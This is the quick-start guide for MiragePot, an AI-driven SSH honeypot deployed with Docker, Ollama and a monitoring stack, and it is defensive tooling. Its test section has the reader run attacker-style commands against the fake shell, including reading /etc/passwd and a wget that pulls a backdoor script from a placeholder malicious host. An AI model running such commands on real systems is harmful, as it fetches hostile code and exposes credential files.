# MiragePot Quick Start Guide

Get MiragePot running in under 5 minutes with Docker.

## Prerequisites

- **Docker** 20.10+ ([Install Docker](https://docs.docker.com/get-docker/))
- **Docker Compose** v2.0+ (included with Docker Desktop)
- **5GB free disk space** (for Ollama models)
- **4GB RAM minimum** (8GB recommended for full stack)

Verify installation:
```bash
docker --version
docker compose version
```

## Quick Deploy (Full Stack - Recommended)

The full stack gives you complete monitoring capabilities with Grafana dashboards, Prometheus metrics, and alerting - perfect for demos and production use.

```bash
# Clone the repository
git clone https://github.com/evinbrijesh/MiragePot.git
cd MiragePot

# Copy environment file
cp .env.docker.example .env.docker

# Deploy full stack (5 containers)
cd docker/
docker compose up -d

# Download AI model (~2GB, takes 2-5 minutes)
docker exec miragepot-ollama ollama pull phi3
```

**That's it!** Your honeypot is now running.

## Access Your Honeypot

| Service | URL | Credentials |
|---------|-----|-------------|
| **SSH Honeypot** | `ssh root@localhost -p 2222` | Any password works |
| **Streamlit Dashboard** | http://localhost:8501 | None |
| **Grafana Dashboards** | http://localhost:3000 | admin / admin |
| **Prometheus** | http://localhost:9091 | None |
| **Alertmanager** | http://localhost:9093 | None |

## Test the Honeypot

Open a terminal and connect as an "attacker":

```bash
ssh root@localhost -p 2222
```

Enter any password when prompted. You're now in a simulated Linux environment!

Try some commands:
```bash
whoami
pwd
ls -la
cat /etc/passwd
uname -a
wget http://malicious.com/backdoor.sh  # AI generates fake output
```

The AI generates realistic responses. Watch the Streamlit dashboard (http://localhost:8501) to see your session being logged in real-time.

## View Your Data

### Streamlit Dashboard (http://localhost:8501)
- Live session activity
- Command history with threat scores
- Real-time statistics

### Grafana Dashboards (http://localhost:3000)
Three pre-built dashboards are automatically provisioned:
- **MiragePot Overview** - Connections, commands, threat summary
- **TTP Analysis** - MITRE ATT&CK technique detection
- **Performance** - LLM latency, cache hit rate

### Session Logs
JSON logs are saved to `data/logs/`:
```bash
ls -la data/logs/
cat data/logs/session_*.json | jq .
```

## Common Commands

```bash
# Check container status
docker compose ps

# View logs
docker compose logs -f

# Stop everything
docker compose down

# Restart services
docker compose restart

# View honeypot logs only
docker logs -f miragepot-honeypot
```

## Offline Deployment (No Internet)

For demos at venues with poor/no internet, create an offline bundle:

```bash
# On machine WITH internet (one-time preparation)
./scripts/export-offline.sh
# Creates: miragepot-offline-bundle.tar.gz (~6-7GB)

# Copy to USB drive, then on demo machine:
tar xzf miragepot-offline-bundle.tar.gz
cd MiragePot/
docker load -i miragepot-images.tar
# ... follow docs/OFFLINE_DEPLOYMENT.md for full instructions
```

See [Offline Deployment Guide](OFFLINE_DEPLOYMENT.md) for complete instructions.

## Troubleshooting

### "Cannot connect to Docker daemon"
```bash
# Start Docker service
sudo systemctl start docker

# Or on macOS/Windows, start Docker Desktop
```

### "Port 2222 already in use"
```bash
# Find what's using the port
sudo lsof -i :2222

# Kill the process or change port in docker-compose.yml
```

### "Ollama model not responding"
```bash
# Check if model is downloaded
docker exec miragepot-ollama ollama list

# Re-pull the model if needed
docker exec miragepot-ollama ollama pull phi3
```

### "Containers not starting"
```bash
# Check container logs
docker compose logs

# Check specific container
docker logs miragepot-honeypot
```

### "Grafana shows no data"
```bash
# Check if Prometheus is scraping metrics
curl http://localhost:9091/api/v1/targets

# Wait 15-30 seconds for first scrape, then refresh Grafana
```

## Stop Everything

```bash
cd docker/
docker compose down

# To also remove volumes (deletes all data):
docker compose down -v
```

## Next Steps

- **Presenting to others?** See [Demo Walkthrough](DEMO_WALKTHROUGH.md)
- **No internet at venue?** See [Offline Deployment](OFFLINE_DEPLOYMENT.md)
- **Configure alerts?** See [Monitoring Guide](MONITORING.md)
- **Customize settings?** See [Configuration Reference](CONFIGURATION.md)
- **Understand internals?** See [Architecture](architecture.md)

## Advanced: Simple Stack (Minimal Deployment)

If you have limited resources or just want quick local testing without monitoring:

```bash
# From project root (not docker/ folder)
cp .env.docker.example .env.docker
docker compose -f docker-compose-simple.yml up -d
docker exec miragepot-ollama-simple ollama pull phi3
```

This deploys only 2 containers (Honeypot + Ollama) without Prometheus/Grafana/Alertmanager.

**Note:** For demos and production, use the Full Stack deployment above for complete visibility into honeypot activity.

---

**Congratulations!** You now have an AI-powered SSH honeypot with full monitoring. Watch attackers interact with your fake server while the AI generates convincing responses!
